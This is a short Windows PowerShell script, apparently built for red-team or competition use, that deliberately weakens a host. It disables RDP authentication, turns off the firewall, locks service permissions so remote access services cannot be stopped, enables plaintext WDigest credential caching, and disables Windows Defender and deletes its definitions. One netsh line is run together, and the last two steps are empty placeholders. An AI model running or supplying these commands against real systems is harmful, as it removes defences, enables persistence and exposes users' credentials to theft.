Write-Host "RDP Weakening (Allow Multiple Simultaneous RDP Connections)"
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v UserAuthentication /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fDenyTSConnections /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /t REG_DWORD /v fSingleSessionPerUser /d 10 /f
Write-Host "Successfully Weakened RDP"

Write-Host "Disable Firewall Service"
sc sdset MpsSvc D:(A;;CCLCSWWPDTLOCRRC;;;SY)(A;;CCDCLCSWWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLC;;;S-1-5-80-2006800713-1441093265-249754844-3404434343-1444102779)S:(AU;FA;CCDCLCSWWPDTLOCRSDRCWDWO;;;WD)
Write-Host "Turn Firewall Off"
Netsh Advfirewall show allprofilesNetSh Advfirewall set allprofiles state off

Write-Host "Prevent WinRM from being disabled"
sc sdset spooler D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPDTLOCRSDRCWDWO;;;WD)
Write-Host "Prevent SSH Service from Being Disabled"
sc sdset sshd D:(A;;CCLCSWRPDTLOCRRC;;;SY)(A;;CCDCLCSWRPDTLOCRRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPDTLOCRRCWDWO;;;WD)
Write-Host "Set PowerShell Execution Policy to Unrestricted"
Set-ExecutionPolicy -ExecutionPolicy unrestricted

Write-Host "Allow plaintext caching of credentials"
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

Write-Host "Disable Windows Defender"
Powershell Set-MpPreference -DisableRealtimeMonitoring $true 
# Remove definitions
"%Program Files%\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

Write-Host "Deploy Sysinternals Killer"

Write-Host "Enable SMB1"

